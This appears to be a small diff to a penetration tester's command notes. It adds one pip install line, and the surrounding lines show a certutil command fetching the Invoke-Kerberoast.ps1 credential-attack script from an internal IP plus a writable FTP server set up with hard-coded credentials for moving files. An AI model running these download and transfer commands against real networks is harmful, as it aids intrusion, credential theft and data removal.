@@ -31,6 +31,7 @@ certutil -urlcache -split -f http://192.168.162.46:80/Invoke-Kerberoast.ps1
 
 ---------------------
 sudo pip3 install pyftpdlib
+pip install cryptography==38.0.4
 sudo python3 -m pyftpdlib -p 21 -u mike -P helps -w
 ftp 192.168.162.46
 user mike helps
